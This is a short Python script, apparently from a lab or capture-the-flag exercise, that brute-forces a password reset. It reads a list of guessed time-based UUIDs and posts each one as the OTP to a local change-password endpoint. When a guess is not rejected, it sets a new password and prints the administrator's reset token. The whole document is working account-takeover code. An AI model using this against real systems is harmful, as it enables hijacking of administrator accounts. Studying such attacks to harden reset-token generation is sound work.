import requests

# Function to process each sublist of UUIDs
def check_uuid_list(uuid_list):
    for uuid in uuid_list:
        uuid = uuid.rstrip("\n")
        if uuid == "910cd669-f46f-11ef-847e-0242ac110002" or uuid == "910cd670-f46f-11ef-847e-0242ac110002": # skip first and last ones as they are the interval
            continue
        url = f"http://localhost:9000/change-password"
        response = requests.post(url, data={"password": "thisismynewpassword", "otp": uuid})
        print(f"Checking UUID: {uuid}")
        if "Invalid or expired OTP" not in response.text:
            print("ResetToken for administrator is: " + uuid)
            break

with open("./uuids_list.txt", "r") as f:
    uuids = f.readlines()

# Loop through the UUIDs and execute check_uuid_list
check_uuid_list(uuids)